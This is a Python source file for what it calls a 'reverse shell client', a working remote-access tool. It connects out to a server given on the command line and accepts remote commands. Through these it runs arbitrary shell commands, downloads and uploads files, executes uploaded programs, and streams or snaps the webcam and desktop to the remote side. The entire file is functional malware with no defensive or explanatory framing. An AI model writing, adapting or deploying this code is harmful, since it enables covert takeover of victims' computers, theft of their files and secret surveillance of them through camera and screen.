import socket
import subprocess
import os
import time
import struct
import sys
import cv2
from PIL import ImageGrab
import io

MAX_RETRIES = 100
RETRY_DELAY = 1
BUFFER_SIZE = 4096

def send_data(sock, data: bytes):
    length = struct.pack('>I', len(data))
    sock.sendall(length + data)

def receive_data(sock):
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    length = struct.unpack('>I', raw_len)[0]
    return recvall(sock, length)

def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def send_file(sock, filename):
    if not os.path.isfile(filename):
        send_data(sock, f"[-] File not found: {filename}".encode('utf-8'))
        return
    with open(filename, 'rb') as f:
        file_bytes = f.read()
    send_data(sock, file_bytes)

def receive_file(sock, filename):
    file_bytes = receive_data(sock)
    if file_bytes is None:
        raise ConnectionError("Connection closed during file reception.")
    with open(filename, 'wb') as f:
        f.write(file_bytes)

def stream_video(sock):
    cam = cv2.VideoCapture(0)
    time.sleep(2)  # Warm up the camera

    if not cam.isOpened():
        send_data(sock, b"[-] Unable to access the webcam.")
        return

    send_data(sock, b"[+] Starting video stream...")

    try:
        while True:
            ret, frame = cam.read()
            if not ret:
                send_data(sock, b"[-] Failed to read frame from webcam.")
                break

            # Encode frame as JPEG
            ret, jpeg = cv2.imencode('.jpg', frame)
            if not ret:
                send_data(sock, b"[-] Failed to encode frame.")
                break

            # Send frame bytes
            send_data(sock, jpeg.tobytes())

            # Check if server wants to stop streaming
            sock.settimeout(0.1)
            try:
                cmd = receive_data(sock)
                if cmd is not None and cmd.decode('utf-8').strip().lower() == "stopstream":
                    send_data(sock, b"[*] Stopping video stream as requested.")
                    break
            except socket.timeout:
                # No command received, continue streaming
                pass
            finally:
                sock.settimeout(None)
    finally:
        cam.release()

def take_webcam_snapshot(sock):
    cam = cv2.VideoCapture(0)
    time.sleep(2)  # Warm up the camera

    if not cam.isOpened():
        send_data(sock, b"[-] Unable to access the webcam for snapshot.")
        return

    ret, frame = cam.read()
    cam.release()

    if not ret:
        send_data(sock, b"[-] Failed to capture snapshot.")
        return

    ret, jpeg = cv2.imencode('.jpg', frame)
    if not ret:
        send_data(sock, b"[-] Failed to encode snapshot.")
        return

    send_data(sock, jpeg.tobytes())

def take_desktop_screenshot(sock):
    try:
        img = ImageGrab.grab()  # Capture full screen
        with io.BytesIO() as buf:
            img.save(buf, format='JPEG')
            jpeg_bytes = buf.getvalue()
        send_data(sock, jpeg_bytes)
    except Exception as e:
        send_data(sock, f"[-] Failed to take screenshot: {e}".encode('utf-8'))

def connect_to_server(server_ip, server_port):
    attempt = 0
    while attempt < MAX_RETRIES:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.connect((server_ip, server_port))
                print(f"[+] Connected to {(server_ip, server_port)}")
                attempt = 0  # reset after successful connect

                while True:
                    command_data = receive_data(sock)
                    if command_data is None:
                        print("[*] Connection closed by server.")
                        break

                    command = command_data.decode('utf-8', errors='ignore').strip()
                    if not command:
                        send_data(sock, b"[!] Empty command received")
                        continue

                    if command.lower() == "exit":
                        send_data(sock, b"[*] Client disconnecting as requested.")
                        print("[*] Server requested exit. Closing connection.")
                        return

                    if command.startswith("cd"):
                        parts = command.split(maxsplit=1)
                        path = parts[1] if len(parts) > 1 else os.path.expanduser("~")
                        try:
                            os.chdir(path)
                            current_dir = os.getcwd()
                            items = os.listdir(current_dir)
                            response = f"[+] Changed directory to {current_dir}\n[*] Contents:\n"
                            for item in items:
                                response += f"    {'[DIR]' if os.path.isdir(item) else '[FILE]'} {item}\n"
                        except Exception as e:
                            response = f"[-] Error: {str(e)}"
                        send_data(sock, response.encode('utf-8'))

                    elif command.startswith("download "):
                        filename = command.split(maxsplit=1)[1]
                        send_file(sock, filename)

                    elif command.startswith("upload "):
                        filename = command.split(maxsplit=1)[1]
                        try:
                            receive_file(sock, filename)
                            send_data(sock, f"[+] Uploaded {filename} successfully.".encode('utf-8'))
                        except Exception as e:
                            send_data(sock, f"[-] Upload failed: {e}".encode('utf-8'))

                    elif command.startswith("run "):
                        filename = command.split(maxsplit=1)[1]
                        if not os.path.exists(filename):
                            send_data(sock, f"[-] File not found: {filename}".encode('utf-8'))
                            continue
                        result = subprocess.run([filename], capture_output=True, text=True, shell=True)
                        output = result.stdout + result.stderr
                        send_data(sock, output.encode('utf-8'))

                    elif command == "stream":
                        stream_video(sock)

                    elif command == "snapshot":
                        take_webcam_snapshot(sock)

                    elif command == "screenshot":
                        take_desktop_screenshot(sock)

                    else:
                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
                        output = result.stdout + result.stderr
                        if not output.strip():
                            output = "[*] Command executed successfully but no output."
                        send_data(sock, output.encode('utf-8'))

        except (ConnectionError, OSError) as e:
            print(f"[!] Connection lost or error: {e}. Retrying in {RETRY_DELAY}s...")
            attempt += 1
            time.sleep(RETRY_DELAY)
        except Exception as e:
            print(f"[!] Unexpected error: {e}. Exiting.")
            break
    else:
        print("[-] Could not connect to the server after multiple attempts.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <server_ip> <server_port>")
        sys.exit(1)

    server_ip = sys.argv[1]
    try:
        server_port = int(sys.argv[2])
    except ValueError:
        print("[-] Port must be an integer.")
        sys.exit(1)

    print("[*] Starting reverse shell client.")
    connect_to_server(server_ip, server_port)
